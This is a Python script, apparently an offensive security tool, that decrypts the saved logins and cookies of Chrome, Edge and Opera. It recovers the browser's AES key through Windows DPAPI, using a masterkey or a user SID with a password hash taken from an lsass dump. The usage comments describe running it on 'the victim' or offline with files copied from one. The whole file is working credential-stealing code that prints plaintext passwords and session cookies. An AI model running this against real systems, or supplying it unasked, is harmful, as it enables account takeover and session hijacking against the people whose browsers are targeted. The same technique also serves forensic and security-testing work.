#!/usr/bin/env python3
r'''
## Shout out: https://github.com/agentzex/chrome_v80_password_grabber & dpapilab (both Python2)
## Shout out: https://onedrive.live.com/view.aspx?resid=A352EBC5934F0254!3104&ithint=file%2cxlsx&authkey=!ACGFg7R-U5xkTh4

## --> This is for Chrome >80, where Chrome has it's own masterkey that is encrypted with DPAPI, 
##       as opposed to older versions where each password/cookievalue was separately encrypted with DPAPI

## It also supports the newer Edge Chromium built: %localappdata%\Microsoft\Edge\User Data\
##  and Opera: %appdata%\Opera Software\Opera Stable\

### Requirements: subdirectory dpapick3 and libraries pycryptodome
    pip3 install pycryptodomex
'''
### FEATURES
## -- Online, look at example below, requires installations above on the victim
## -- Offline, requires
##     Chrome/Edge files "Local State" and either "Cookies" or "Login Data" (or both) and
##     DPAPI Masterkey (128chars) OR
##     the GUID file + User SID + User SHA1 hash
##       --> SID and HASH are from lsass.dmp, 'pypykatz lsa minidump lsass.dmp'), or the user password instead of the hash (no lsass dump needed then)
## -- Example for your online Windows machine:
##      Get your SID by looking at directory where the GUID file was found
##    chrome-edge-opera-dec.py -l "%localappdata%\Google\Chrome\User Data\Local State"
##     and
##    chrome-edge-opera-dec.py -l "%localappdata%\Google\Chrome\User Data\Local State" -d "%localappdata%\Google\Chrome\User Data\Default\Login Data" -g "%appdata%\Microsoft\Protect\<SID>\<GUID>" -p "myPassword" -s <SID>
##    chrome-edge-opera-dec.py -l "%localappdata%\Edge\Chrome\User Data\Local State" -d "%localappdata%\Google\Edge\User Data\Default\Login Data" -g "%appdata%\Microsoft\Protect\<SID>\<GUID>" -p "myPassword" -s <SID>
## -- Offline example (e.g. Kali):
##      Copy Chrome 'Local State', Chrome 'Login Data' and Windows GUID File from the victim together with user SID and hash, put the 3 files in same directory as script
##    chrome-edge-opera-dec.py -l 'Local State' -d 'Login Data' -s S-1-5-21-7375663-6890924511-1272660413-2944159-1001 -g c6cabd99-988b-4aa3-9b1f-d689fa04011d -a da39a3ee5e6b4b0d3255bfef95601890afd80709 ## FYI: this is empty SHA1 hash

## TODO: maybe older MasterKey's are used, incorporate CREDHIST

import argparse, os, json, base64, sqlite3, time, hashlib, warnings
from Cryptodome.Cipher import AES ## pip install pycryptodomex
## The dpapick library relies on M2Crypto, which is hard to install and certain versions give a warning in M2Crypto\X509.py, line 44 ('is not' should be '!='), can be ignored (or updated)
warnings.filterwarnings("ignore")
try:
    import dpapick3.blob as blob
    import dpapick3.masterkey as masterkey
except ImportError:
    raise ImportError('Missing dpapick3, please install via pip install dpapick3.')
    exit(1)
#### Global Vars
sLocalStateFile = sLoginDataFile = sCookiesFile = sMasterkey = ''
sGUIDFile = sUserSID = sUserHash = sUserPass = None

def parseArgs():
    global sLocalStateFile, sLoginDataFile, sCookiesFile, sMasterkey, sGUIDFile, sUserSID, sUserHash
    
    print('[!] Welcome. To decrypt, one of three combo\'s is required: \n'
          'Master Key (alone) / GUID file, SID and User Hash / GUID file, SID and User Password\n'
          'Browser data can be found here:\n'
          '%localappdata%\\Google\\Chrome\\User Data\\Local State')
    oParser = argparse.ArgumentParser()
    oParser.add_argument('-l', metavar='FILE', help='Path to Chrome/Edge Local State file', default='Local State')
    oParser.add_argument('-d', metavar='FILE', help='Path to Chrome/Edge Login Data file (optional)')
    oParser.add_argument('-c', metavar='FILE', help='Path to Chrome/Edge Cookies file (optional)')
    oParser.add_argument('-m', metavar='HEX', help='Specify Master Key, format 128 HEX Characters (optional)')
    oParser.add_argument('-g', metavar='FILE', help='Specify GUID file to get Master Key from (as found in Local State, optional)')
    oParser.add_argument('-s', metavar='SID', help='Specify user SID, found in lsassdump and corresponding to GUID, e.g. S-1-5-21-7375663-6890924511-1272660413-2944159-1001 (optional)')
    oParser.add_argument('-a', metavar='HASH', help='Specify user password SHA1 hash (NTLM a no go), e.g. da39a3ee5e6b4b0d3255bfef95601890afd80709 (optional)')
    oParser.add_argument('-p', metavar='PASS', help='Specify user password, will use it to calculate the SHA1 hash (optional)')
    oArgs = oParser.parse_args()
    if os.path.isfile(oArgs.l): sLocalStateFile = oArgs.l
    else: exit('[-] Fatal, which Local State file to use please?')
    if oArgs.d and os.path.isfile(oArgs.d): sLoginDataFile = oArgs.d
    if oArgs.c and os.path.isfile(oArgs.c): sCookiesFile = oArgs.c
    if oArgs.m:
        sMasterkey = oArgs.m
        return
    else:
        if not oArgs.g:
            print('[-] Warning: without Masterkey nor GUID file, cannot decrypt.')
            return
        elif not oArgs.s:
            print('[-] Warning: without Masterkey nor user SID, cannot decrypt.')
            return
        elif not oArgs.a and not oArgs.p:
            print('[-] Warning: without Masterkey nor user HASH or PASS, cannot decrypt.')
            return
        else:
            if not os.path.isfile(oArgs.g): exit('[-] Error: GUID file ' + oArgs.g + ' not found!')
            sGUIDFile = oArgs.g
            sUserSID = oArgs.s
            if oArgs.a: sUserHash = oArgs.a
            else: sUserHash = hashlib.new('sha1', oArgs.p.encode('UTF-16LE')).digest().hex()
    return

def getDPAPIMasterKey(sGUIDFile, sUserSID, sUserHash):
    try:
        with open(sGUIDFile, 'rb') as oFile: oMasterKey = masterkey.MasterKeyFile(oFile.read())
        oFile.close()
    except Exception as e:
        print(e)
        print('[-] Error: file ' + sGUIDFile + ' does not seem to be a valid DPAPI MasterKey file')
        return False
    oMasterKey.decryptWithHash(sUserSID, bytes.fromhex(sUserHash))
    if oMasterKey.decrypted:
        sMK = oMasterKey.get_key()
        print('[+] Success! Decrypted masterkey')
        print('[!] Masterkey for GUID (' + oMasterKey.guid.decode(errors='ignore') + ': \n     ' + sMK.hex())
        return sMK.hex()
    else: print('[-] Failed, make sure all is correct for GUID ' + oMasterKey.guid)
    return False

def getBlobMkGuid(sEncryptedChromeKey):
    global sMasterkey
    oBlob = blob.DPAPIBlob(sEncryptedChromeKey)
    ## oBlob.provider == guidProvider
    #print(oBlob)
    print('[+] MasterKey (' + sLocalStateFile + ') has GUID: ' + oBlob.mkguid)
    if not sMasterkey: print('[!] Go and find this file and accompanying SID + SHA1 Hash')
    return oBlob

def decryptBlob(oBlob, sMasterKey):
    if oBlob.decrypt(bytes.fromhex(sMasterKey.decode(errors='ignore'))): return oBlob.cleartext
    return ''

def getChromeKey(sLocalStateFile, sMasterkey = None):
    try:
        with open(sLocalStateFile, 'r') as oFile: lLocalState = json.loads(oFile.read())
        oFile.close()
        sEncryptedChromeKey = base64.b64decode(lLocalState["os_crypt"]["encrypted_key"])[5:]
    except:
        print('[-] Error: file ' + sLocalStateFile + ' not a (correct) Chrome State file')
        return False

    oBlob = getBlobMkGuid(sEncryptedChromeKey)
    sMkGuid = oBlob.mkguid
    if sMasterkey:
        sChromeKey = decryptBlob(oBlob, sMasterkey)
        if sChromeKey == '':
            print('[-] This DPAPI masterkey does not work to decrypt the Chrome/Edge Key ...')
            return b''
        return sChromeKey.hex()
    else: return None

def decryptChromeString(sData, sChromeKey):
    try: sChromeKey = bytes.fromhex(sChromeKey) ## Key must be RAW bytes, but maybe it already is
    except: pass
    try:
        sIV = sData[3:15]
        sPayload = sData[15:]
        cipher = AES.new(sChromeKey, AES.MODE_GCM, sIV)
        sDecryptedString = cipher.decrypt(sPayload)
        sDecryptedString = sDecryptedString[:-16].decode(errors='ignore')
        return sDecryptedString
    except Exception as e:
        # print("Probably saved password from Chrome version older than v80\n")
        print(str(e))
        return 'Chrome < 80 or domain cred'

def decryptCookies(sCookiesFile, sChromeKey):
    oConn = sqlite3.connect(sCookiesFile)
    oCursor = oConn.cursor()
    try:
        oCursor.execute('SELECT name, encrypted_value, host_key, path, is_secure, is_httponly, creation_utc, expires_utc FROM cookies ORDER BY host_key')
        for arrData in oCursor.fetchall():
            print('Name:     {}'.format(arrData[0]))
            print('Content:  {}'.format(decryptChromeString(arrData[1], sChromeKey)))
            print('Domain:   {}'.format(arrData[2]))
            print('Path:     {}'.format(arrData[3]))
            if arrData[4] == 1: print('Send for: Secure connections only')
            else: print('Send for: Any kind of connection')
            if arrData[5] == 1: print('HttpOnly: Yes')
            else: print('HttpOnly: No (Accessible to scripts)')
            ## Chrome timestamp is "amount of microseconds since 01-01-1601", so let's do math
            print('Created:  {}'.format(time.strftime('%Y-%m-%d %H:%M:%S', time.localtime(arrData[6] / 1000000 - 11644473600))))
            print('Expires:  {}'.format(time.strftime('%Y-%m-%d %H:%M:%S', time.localtime(arrData[7] / 1000000 - 11644473600))))
            print('*' * 50 + '\n')
    except Exception as e:
        print('[-] Reading failed, is ' + sCookiesFile + ' a Chrome/Edge Cookies file (that\'s not in use)?')
    oCursor.close()
    oConn.close()

def decryptLoginData(sLoginDataFile, sChromeKey):
    oConn = sqlite3.connect(sLoginDataFile)
    oCursor = oConn.cursor()
    try:
        oCursor.execute('SELECT action_url, username_value, password_value FROM logins')
        for arrData in oCursor.fetchall():
            print('URL:       {}'.format(arrData[0]))
            print('User Name: {}'.format(arrData[1]))
            print('Password:  {}'.format(decryptChromeString(arrData[2], sChromeKey)))
            print('*' * 50 + '\n')
    except Exception as e:
        #print(e)
        print('[-] Reading failed, is ' + sLoginDataFile + ' a Chrome Login Data file (that\'s not in use)?')
    oCursor.close()
    oConn.close()

if __name__ == '__main__':
    parseArgs()
   
    if sMasterkey == '' and sGUIDFile and sUserSID and sUserHash:
        print('[!] Trying to decrypt the DPAPI Masterkey from file ' + sGUIDFile)
        sMasterkey = getDPAPIMasterKey(sGUIDFile, sUserSID, sUserHash)

    sChromeAESKey = getChromeKey(sLocalStateFile, sMasterkey.encode())
    if not sChromeAESKey: exit(1)

    print('[+] Got Chrome/Edge Encryption Key: ' + sChromeAESKey)
    print('*' * 50)
    
    if sLoginDataFile:
        print('[!] Trying to decrypt the Login Data from file ' + sLoginDataFile)
        decryptLoginData(sLoginDataFile, sChromeAESKey)
    if sCookiesFile:
        print('[!] Trying to decrypt the Cookies from file ' + sCookiesFile)
        decryptCookies(sCookiesFile, sChromeAESKey)
